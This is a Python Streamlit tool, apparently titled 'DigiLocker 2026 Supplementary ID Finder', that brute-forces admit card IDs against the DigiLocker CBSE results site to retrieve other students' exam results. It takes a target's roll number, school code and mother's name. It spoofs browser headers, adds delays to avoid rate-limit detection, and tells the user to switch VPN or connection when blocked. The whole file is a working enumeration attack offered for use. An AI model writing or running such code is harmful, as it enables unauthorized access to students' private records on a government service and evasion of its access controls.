import streamlit as st
import requests
import itertools
import string
import time
import random
from concurrent.futures import ThreadPoolExecutor

st.set_page_config(page_title="DigiLocker CBSE Engine", page_icon="📝")

st.title("DigiLocker 2026 Supplementary ID Finder")
st.caption("Made by Legionnaire")

st.divider()

# --- Disclaimer ---
st.info("Notice: School Code and Admit Card Suffix need not be changed if you are scanning for students in your same school/center block.")

# --- Main Page Inputs ---
st.subheader("Target Parameters")
col1, col2 = st.columns(2)
with col1:
    roll_no = st.text_input("Roll Number", value="18602421")
    school_code = st.text_input("School Number", value="45498")
with col2:
    mothers_name = st.text_input("Mother's Name (as per admit card)", value="").strip()
    fixed_suffix = st.text_input("Admit Card Suffix", value="4510")

st.subheader("Execution Settings")
col3, col4 = st.columns(2)
with col3:
    threads = st.slider("Threads (Concurrency):", 1, 5, 2)
with col4:
    start_combo = st.text_input("Start From:", value="A").upper()

# Target DigiLocker Endpoints
base_url = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.html"
api_url = "https://results.digilocker.gov.in/api/get_cbse_result"  # DigiLocker standard API bridge

def get_browser_session():
    """Initializes a full desktop browser session with realistic headers."""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': base_url,
        'Origin': 'https://results.digilocker.gov.in',
        'Connection': 'keep-alive',
        'Sec-Ch-Ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    })
    return session

def check_id_sync(combo):
    admit_id = f"{combo}{roll_no[-2:]}{fixed_suffix}"
    session = get_browser_session()
    
    # Establish initial session cookies
    try:
        session.get(base_url, timeout=8)
    except:
        pass

    # JSON Payload matching modern SPA API models
    json_payload = {
        "rollNumber": roll_no,
        "schoolNumber": school_code,
        "admitCardId": admit_id,
        "motherName": mothers_name,
        "examClass": "XII",
        "examType": "Supplementary",
        "year": "2026"
    }

    # Form Payload fallback for hybrid endpoints
    form_payload = {
        "regno": roll_no,
        "sch": school_code,
        "admid": admit_id,
        "mname": mothers_name,
        "terms": "on",
        "B2": "Submit"
    }

    try:
        # Micro-delay to avoid rate burst flagging
        time.sleep(random.uniform(0.2, 0.4))
        
        # Primary Attempt: JSON API dispatch
        response = session.post(api_url, json=json_payload, timeout=8)
        
        # Secondary Attempt: If API returns 404/405, post standard form
        if response.status_code in [404, 405]:
            post_fallback = "https://results.digilocker.gov.in/cbse12thcompresults2026augXII.asp"
            response = session.post(post_fallback, data=form_payload, timeout=8)

        text = response.text

        # Detection logic
        if response.status_code == 200 and ("Roll" in text or "Subject" in text or "PASS" in text or "totalMarks" in text) and "Invalid" not in text and "not found" not in text.lower():
            return "SUCCESS", (admit_id, text)
        
        if response.status_code in [403, 429] or "Access Denied" in text or "Cloudflare" in text:
            return "BLOCKED", combo

    except Exception:
        pass
        
    return "FAIL", combo

def run_scan():
    if not mothers_name:
        st.warning("Please enter Mother's Name before starting the scan.")
        return

    vowels = ['A', 'E', 'I', 'O', 'U']
    chars = vowels + [c for c in string.ascii_uppercase if c not in vowels]
        
    combos_1 = ["".join(c) for c in itertools.product(chars, repeat=1)]
    combos_2 = ["".join(c) for c in itertools.product(chars, repeat=2)]
    all_combos = combos_1 + combos_2
    
    try:
        start_idx = all_combos.index(start_combo)
        search_space = all_combos[start_idx:]
    except ValueError:
        search_space = all_combos

    progress_bar = st.progress(0)
    status_text = st.empty()
    found = False

    st.info(f"Scan active: Cycling through {len(search_space)} integrated combinations.")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_combo = {executor.submit(check_id_sync, combo): combo for combo in search_space}
        
        for i, future in enumerate(future_to_combo):
            try:
                res_type, data = future.result()
            except:
                continue
            
            done = i + 1
            progress_bar.progress(min(done / len(search_space), 1.0))
            
            display_id = data[0] if res_type == "SUCCESS" else data
            status_text.write(f"Testing: '{display_id}' | Progress: {done}/{len(search_space)}")

            if res_type == "SUCCESS":
                admit_id, html = data
                st.success(f"Match found: {admit_id}")
                st.components.v1.html(html, height=800, scrolling=True)
                found = True
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            if res_type == "BLOCKED":
                st.error(f"IP limited at ID '{data}'. Change connection/VPN and resume from '{data}'.")
                executor.shutdown(wait=False, cancel_futures=True)
                return

    if not found:
        st.warning("Scan complete. No matching ID found.")

if st.button("Start Scan"):
    run_scan()
